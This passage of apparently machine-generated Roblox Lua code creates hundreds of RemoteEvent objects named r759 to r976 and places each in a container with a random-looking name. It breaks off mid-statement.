local r759 = Instance.new("RemoteEvent")
r759.Name = "r759"
r759.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r76 = Instance.new("RemoteEvent")
r76.Name = "r76"
r76.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r760 = Instance.new("RemoteEvent")
r760.Name = "r760"
r760.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r761 = Instance.new("RemoteEvent")
r761.Name = "r761"
r761.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r762 = Instance.new("RemoteEvent")
r762.Name = "r762"
r762.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r763 = Instance.new("RemoteEvent")
r763.Name = "r763"
r763.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r764 = Instance.new("RemoteEvent")
r764.Name = "r764"
r764.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r765 = Instance.new("RemoteEvent")
r765.Name = "r765"
r765.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r766 = Instance.new("RemoteEvent")
r766.Name = "r766"
r766.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r767 = Instance.new("RemoteEvent")
r767.Name = "r767"
r767.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r768 = Instance.new("RemoteEvent")
r768.Name = "r768"
r768.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r769 = Instance.new("RemoteEvent")
r769.Name = "r769"
r769.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r77 = Instance.new("RemoteEvent")
r77.Name = "r77"
r77.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r770 = Instance.new("RemoteEvent")
r770.Name = "r770"
r770.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r771 = Instance.new("RemoteEvent")
r771.Name = "r771"
r771.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r772 = Instance.new("RemoteEvent")
r772.Name = "r772"
r772.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r773 = Instance.new("RemoteEvent")
r773.Name = "r773"
r773.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r774 = Instance.new("RemoteEvent")
r774.Name = "r774"
r774.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r775 = Instance.new("RemoteEvent")
r775.Name = "r775"
r775.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r776 = Instance.new("RemoteEvent")
r776.Name = "r776"
r776.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r777 = Instance.new("RemoteEvent")
r777.Name = "r777"
r777.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r778 = Instance.new("RemoteEvent")
r778.Name = "r778"
r778.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r779 = Instance.new("RemoteEvent")
r779.Name = "r779"
r779.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r78 = Instance.new("RemoteEvent")
r78.Name = "r78"
r78.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r780 = Instance.new("RemoteEvent")
r780.Name = "r780"
r780.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r781 = Instance.new("RemoteEvent")
r781.Name = "r781"
r781.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r782 = Instance.new("RemoteEvent")
r782.Name = "r782"
r782.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r783 = Instance.new("RemoteEvent")
r783.Name = "r783"
r783.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r784 = Instance.new("RemoteEvent")
r784.Name = "r784"
r784.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r785 = Instance.new("RemoteEvent")
r785.Name = "r785"
r785.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r786 = Instance.new("RemoteEvent")
r786.Name = "r786"
r786.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r787 = Instance.new("RemoteEvent")
r787.Name = "r787"
r787.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r788 = Instance.new("RemoteEvent")
r788.Name = "r788"
r788.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r789 = Instance.new("RemoteEvent")
r789.Name = "r789"
r789.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r79 = Instance.new("RemoteEvent")
r79.Name = "r79"
r79.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r790 = Instance.new("RemoteEvent")
r790.Name = "r790"
r790.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r791 = Instance.new("RemoteEvent")
r791.Name = "r791"
r791.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r792 = Instance.new("RemoteEvent")
r792.Name = "r792"
r792.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r793 = Instance.new("RemoteEvent")
r793.Name = "r793"
r793.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r794 = Instance.new("RemoteEvent")
r794.Name = "r794"
r794.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r795 = Instance.new("RemoteEvent")
r795.Name = "r795"
r795.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r796 = Instance.new("RemoteEvent")
r796.Name = "r796"
r796.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r797 = Instance.new("RemoteEvent")
r797.Name = "r797"
r797.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r798 = Instance.new("RemoteEvent")
r798.Name = "r798"
r798.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r799 = Instance.new("RemoteEvent")
r799.Name = "r799"
r799.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r8 = Instance.new("RemoteEvent")
r8.Name = "r8"
r8.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r80 = Instance.new("RemoteEvent")
r80.Name = "r80"
r80.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r800 = Instance.new("RemoteEvent")
r800.Name = "r800"
r800.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r801 = Instance.new("RemoteEvent")
r801.Name = "r801"
r801.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r802 = Instance.new("RemoteEvent")
r802.Name = "r802"
r802.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r803 = Instance.new("RemoteEvent")
r803.Name = "r803"
r803.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r804 = Instance.new("RemoteEvent")
r804.Name = "r804"
r804.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r805 = Instance.new("RemoteEvent")
r805.Name = "r805"
r805.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r806 = Instance.new("RemoteEvent")
r806.Name = "r806"
r806.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r807 = Instance.new("RemoteEvent")
r807.Name = "r807"
r807.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r808 = Instance.new("RemoteEvent")
r808.Name = "r808"
r808.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r809 = Instance.new("RemoteEvent")
r809.Name = "r809"
r809.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r81 = Instance.new("RemoteEvent")
r81.Name = "r81"
r81.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r810 = Instance.new("RemoteEvent")
r810.Name = "r810"
r810.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r811 = Instance.new("RemoteEvent")
r811.Name = "r811"
r811.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r812 = Instance.new("RemoteEvent")
r812.Name = "r812"
r812.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r813 = Instance.new("RemoteEvent")
r813.Name = "r813"
r813.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r814 = Instance.new("RemoteEvent")
r814.Name = "r814"
r814.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r815 = Instance.new("RemoteEvent")
r815.Name = "r815"
r815.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r816 = Instance.new("RemoteEvent")
r816.Name = "r816"
r816.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r817 = Instance.new("RemoteEvent")
r817.Name = "r817"
r817.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r818 = Instance.new("RemoteEvent")
r818.Name = "r818"
r818.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r819 = Instance.new("RemoteEvent")
r819.Name = "r819"
r819.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r82 = Instance.new("RemoteEvent")
r82.Name = "r82"
r82.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r820 = Instance.new("RemoteEvent")
r820.Name = "r820"
r820.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r821 = Instance.new("RemoteEvent")
r821.Name = "r821"
r821.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r822 = Instance.new("RemoteEvent")
r822.Name = "r822"
r822.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r823 = Instance.new("RemoteEvent")
r823.Name = "r823"
r823.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r824 = Instance.new("RemoteEvent")
r824.Name = "r824"
r824.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r825 = Instance.new("RemoteEvent")
r825.Name = "r825"
r825.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r826 = Instance.new("RemoteEvent")
r826.Name = "r826"
r826.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r827 = Instance.new("RemoteEvent")
r827.Name = "r827"
r827.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r828 = Instance.new("RemoteEvent")
r828.Name = "r828"
r828.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r829 = Instance.new("RemoteEvent")
r829.Name = "r829"
r829.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r83 = Instance.new("RemoteEvent")
r83.Name = "r83"
r83.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r830 = Instance.new("RemoteEvent")
r830.Name = "r830"
r830.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r831 = Instance.new("RemoteEvent")
r831.Name = "r831"
r831.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r832 = Instance.new("RemoteEvent")
r832.Name = "r832"
r832.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r833 = Instance.new("RemoteEvent")
r833.Name = "r833"
r833.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r834 = Instance.new("RemoteEvent")
r834.Name = "r834"
r834.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r835 = Instance.new("RemoteEvent")
r835.Name = "r835"
r835.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r836 = Instance.new("RemoteEvent")
r836.Name = "r836"
r836.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r837 = Instance.new("RemoteEvent")
r837.Name = "r837"
r837.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r838 = Instance.new("RemoteEvent")
r838.Name = "r838"
r838.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r839 = Instance.new("RemoteEvent")
r839.Name = "r839"
r839.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r84 = Instance.new("RemoteEvent")
r84.Name = "r84"
r84.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r840 = Instance.new("RemoteEvent")
r840.Name = "r840"
r840.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r841 = Instance.new("RemoteEvent")
r841.Name = "r841"
r841.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r842 = Instance.new("RemoteEvent")
r842.Name = "r842"
r842.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r843 = Instance.new("RemoteEvent")
r843.Name = "r843"
r843.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r844 = Instance.new("RemoteEvent")
r844.Name = "r844"
r844.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r845 = Instance.new("RemoteEvent")
r845.Name = "r845"
r845.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r846 = Instance.new("RemoteEvent")
r846.Name = "r846"
r846.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r847 = Instance.new("RemoteEvent")
r847.Name = "r847"
r847.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r848 = Instance.new("RemoteEvent")
r848.Name = "r848"
r848.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r849 = Instance.new("RemoteEvent")
r849.Name = "r849"
r849.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r85 = Instance.new("RemoteEvent")
r85.Name = "r85"
r85.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r850 = Instance.new("RemoteEvent")
r850.Name = "r850"
r850.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r851 = Instance.new("RemoteEvent")
r851.Name = "r851"
r851.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r852 = Instance.new("RemoteEvent")
r852.Name = "r852"
r852.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r853 = Instance.new("RemoteEvent")
r853.Name = "r853"
r853.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r854 = Instance.new("RemoteEvent")
r854.Name = "r854"
r854.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r855 = Instance.new("RemoteEvent")
r855.Name = "r855"
r855.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r856 = Instance.new("RemoteEvent")
r856.Name = "r856"
r856.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r857 = Instance.new("RemoteEvent")
r857.Name = "r857"
r857.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r858 = Instance.new("RemoteEvent")
r858.Name = "r858"
r858.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r859 = Instance.new("RemoteEvent")
r859.Name = "r859"
r859.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r86 = Instance.new("RemoteEvent")
r86.Name = "r86"
r86.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r860 = Instance.new("RemoteEvent")
r860.Name = "r860"
r860.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r861 = Instance.new("RemoteEvent")
r861.Name = "r861"
r861.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r862 = Instance.new("RemoteEvent")
r862.Name = "r862"
r862.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r863 = Instance.new("RemoteEvent")
r863.Name = "r863"
r863.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r864 = Instance.new("RemoteEvent")
r864.Name = "r864"
r864.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r865 = Instance.new("RemoteEvent")
r865.Name = "r865"
r865.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r866 = Instance.new("RemoteEvent")
r866.Name = "r866"
r866.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r867 = Instance.new("RemoteEvent")
r867.Name = "r867"
r867.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r868 = Instance.new("RemoteEvent")
r868.Name = "r868"
r868.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r869 = Instance.new("RemoteEvent")
r869.Name = "r869"
r869.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r87 = Instance.new("RemoteEvent")
r87.Name = "r87"
r87.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r870 = Instance.new("RemoteEvent")
r870.Name = "r870"
r870.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r871 = Instance.new("RemoteEvent")
r871.Name = "r871"
r871.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r872 = Instance.new("RemoteEvent")
r872.Name = "r872"
r872.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r873 = Instance.new("RemoteEvent")
r873.Name = "r873"
r873.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r874 = Instance.new("RemoteEvent")
r874.Name = "r874"
r874.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r875 = Instance.new("RemoteEvent")
r875.Name = "r875"
r875.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r876 = Instance.new("RemoteEvent")
r876.Name = "r876"
r876.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r877 = Instance.new("RemoteEvent")
r877.Name = "r877"
r877.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r878 = Instance.new("RemoteEvent")
r878.Name = "r878"
r878.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r879 = Instance.new("RemoteEvent")
r879.Name = "r879"
r879.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r88 = Instance.new("RemoteEvent")
r88.Name = "r88"
r88.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r880 = Instance.new("RemoteEvent")
r880.Name = "r880"
r880.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r881 = Instance.new("RemoteEvent")
r881.Name = "r881"
r881.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r882 = Instance.new("RemoteEvent")
r882.Name = "r882"
r882.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r883 = Instance.new("RemoteEvent")
r883.Name = "r883"
r883.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r884 = Instance.new("RemoteEvent")
r884.Name = "r884"
r884.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r885 = Instance.new("RemoteEvent")
r885.Name = "r885"
r885.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r886 = Instance.new("RemoteEvent")
r886.Name = "r886"
r886.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r887 = Instance.new("RemoteEvent")
r887.Name = "r887"
r887.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r888 = Instance.new("RemoteEvent")
r888.Name = "r888"
r888.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r889 = Instance.new("RemoteEvent")
r889.Name = "r889"
r889.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r89 = Instance.new("RemoteEvent")
r89.Name = "r89"
r89.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r890 = Instance.new("RemoteEvent")
r890.Name = "r890"
r890.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r891 = Instance.new("RemoteEvent")
r891.Name = "r891"
r891.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r892 = Instance.new("RemoteEvent")
r892.Name = "r892"
r892.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r893 = Instance.new("RemoteEvent")
r893.Name = "r893"
r893.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r894 = Instance.new("RemoteEvent")
r894.Name = "r894"
r894.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r895 = Instance.new("RemoteEvent")
r895.Name = "r895"
r895.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r896 = Instance.new("RemoteEvent")
r896.Name = "r896"
r896.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r897 = Instance.new("RemoteEvent")
r897.Name = "r897"
r897.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r898 = Instance.new("RemoteEvent")
r898.Name = "r898"
r898.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r899 = Instance.new("RemoteEvent")
r899.Name = "r899"
r899.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r9 = Instance.new("RemoteEvent")
r9.Name = "r9"
r9.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r90 = Instance.new("RemoteEvent")
r90.Name = "r90"
r90.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r900 = Instance.new("RemoteEvent")
r900.Name = "r900"
r900.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r901 = Instance.new("RemoteEvent")
r901.Name = "r901"
r901.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r902 = Instance.new("RemoteEvent")
r902.Name = "r902"
r902.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r903 = Instance.new("RemoteEvent")
r903.Name = "r903"
r903.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r904 = Instance.new("RemoteEvent")
r904.Name = "r904"
r904.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r905 = Instance.new("RemoteEvent")
r905.Name = "r905"
r905.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r906 = Instance.new("RemoteEvent")
r906.Name = "r906"
r906.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r907 = Instance.new("RemoteEvent")
r907.Name = "r907"
r907.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r908 = Instance.new("RemoteEvent")
r908.Name = "r908"
r908.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r909 = Instance.new("RemoteEvent")
r909.Name = "r909"
r909.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r91 = Instance.new("RemoteEvent")
r91.Name = "r91"
r91.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r910 = Instance.new("RemoteEvent")
r910.Name = "r910"
r910.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r911 = Instance.new("RemoteEvent")
r911.Name = "r911"
r911.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r912 = Instance.new("RemoteEvent")
r912.Name = "r912"
r912.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r913 = Instance.new("RemoteEvent")
r913.Name = "r913"
r913.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r914 = Instance.new("RemoteEvent")
r914.Name = "r914"
r914.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r915 = Instance.new("RemoteEvent")
r915.Name = "r915"
r915.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r916 = Instance.new("RemoteEvent")
r916.Name = "r916"
r916.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r917 = Instance.new("RemoteEvent")
r917.Name = "r917"
r917.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r918 = Instance.new("RemoteEvent")
r918.Name = "r918"
r918.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r919 = Instance.new("RemoteEvent")
r919.Name = "r919"
r919.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r92 = Instance.new("RemoteEvent")
r92.Name = "r92"
r92.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r920 = Instance.new("RemoteEvent")
r920.Name = "r920"
r920.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r921 = Instance.new("RemoteEvent")
r921.Name = "r921"
r921.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r922 = Instance.new("RemoteEvent")
r922.Name = "r922"
r922.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r923 = Instance.new("RemoteEvent")
r923.Name = "r923"
r923.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r924 = Instance.new("RemoteEvent")
r924.Name = "r924"
r924.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r925 = Instance.new("RemoteEvent")
r925.Name = "r925"
r925.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r926 = Instance.new("RemoteEvent")
r926.Name = "r926"
r926.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r927 = Instance.new("RemoteEvent")
r927.Name = "r927"
r927.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r928 = Instance.new("RemoteEvent")
r928.Name = "r928"
r928.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r929 = Instance.new("RemoteEvent")
r929.Name = "r929"
r929.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r93 = Instance.new("RemoteEvent")
r93.Name = "r93"
r93.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r930 = Instance.new("RemoteEvent")
r930.Name = "r930"
r930.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r931 = Instance.new("RemoteEvent")
r931.Name = "r931"
r931.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r932 = Instance.new("RemoteEvent")
r932.Name = "r932"
r932.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r933 = Instance.new("RemoteEvent")
r933.Name = "r933"
r933.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r934 = Instance.new("RemoteEvent")
r934.Name = "r934"
r934.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r935 = Instance.new("RemoteEvent")
r935.Name = "r935"
r935.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r936 = Instance.new("RemoteEvent")
r936.Name = "r936"
r936.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r937 = Instance.new("RemoteEvent")
r937.Name = "r937"
r937.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r938 = Instance.new("RemoteEvent")
r938.Name = "r938"
r938.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r939 = Instance.new("RemoteEvent")
r939.Name = "r939"
r939.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r94 = Instance.new("RemoteEvent")
r94.Name = "r94"
r94.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r940 = Instance.new("RemoteEvent")
r940.Name = "r940"
r940.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r941 = Instance.new("RemoteEvent")
r941.Name = "r941"
r941.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r942 = Instance.new("RemoteEvent")
r942.Name = "r942"
r942.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r943 = Instance.new("RemoteEvent")
r943.Name = "r943"
r943.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r944 = Instance.new("RemoteEvent")
r944.Name = "r944"
r944.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r945 = Instance.new("RemoteEvent")
r945.Name = "r945"
r945.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r946 = Instance.new("RemoteEvent")
r946.Name = "r946"
r946.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r947 = Instance.new("RemoteEvent")
r947.Name = "r947"
r947.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r948 = Instance.new("RemoteEvent")
r948.Name = "r948"
r948.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r949 = Instance.new("RemoteEvent")
r949.Name = "r949"
r949.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r95 = Instance.new("RemoteEvent")
r95.Name = "r95"
r95.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r950 = Instance.new("RemoteEvent")
r950.Name = "r950"
r950.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r951 = Instance.new("RemoteEvent")
r951.Name = "r951"
r951.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r952 = Instance.new("RemoteEvent")
r952.Name = "r952"
r952.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r953 = Instance.new("RemoteEvent")
r953.Name = "r953"
r953.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r954 = Instance.new("RemoteEvent")
r954.Name = "r954"
r954.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r955 = Instance.new("RemoteEvent")
r955.Name = "r955"
r955.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r956 = Instance.new("RemoteEvent")
r956.Name = "r956"
r956.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r957 = Instance.new("RemoteEvent")
r957.Name = "r957"
r957.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r958 = Instance.new("RemoteEvent")
r958.Name = "r958"
r958.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r959 = Instance.new("RemoteEvent")
r959.Name = "r959"
r959.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r96 = Instance.new("RemoteEvent")
r96.Name = "r96"
r96.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r960 = Instance.new("RemoteEvent")
r960.Name = "r960"
r960.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r961 = Instance.new("RemoteEvent")
r961.Name = "r961"
r961.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r962 = Instance.new("RemoteEvent")
r962.Name = "r962"
r962.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r963 = Instance.new("RemoteEvent")
r963.Name = "r963"
r963.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r964 = Instance.new("RemoteEvent")
r964.Name = "r964"
r964.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r965 = Instance.new("RemoteEvent")
r965.Name = "r965"
r965.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r966 = Instance.new("RemoteEvent")
r966.Name = "r966"
r966.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r967 = Instance.new("RemoteEvent")
r967.Name = "r967"
r967.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r968 = Instance.new("RemoteEvent")
r968.Name = "r968"
r968.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r969 = Instance.new("RemoteEvent")
r969.Name = "r969"
r969.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r97 = Instance.new("RemoteEvent")
r97.Name = "r97"
r97.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r970 = Instance.new("RemoteEvent")
r970.Name = "r970"
r970.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r971 = Instance.new("RemoteEvent")
r971.Name = "r971"
r971.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r972 = Instance.new("RemoteEvent")
r972.Name = "r972"
r972.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r973 = Instance.new("RemoteEvent")
r973.Name = "r973"
r973.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r974 = Instance.new("RemoteEvent")
r974.Name = "r974"
r974.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r975 = Instance.new("RemoteEvent")
r975.Name = "r975"
r975.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r976 = Instance.new("RemoteEvent")
r976.Name = "r976"
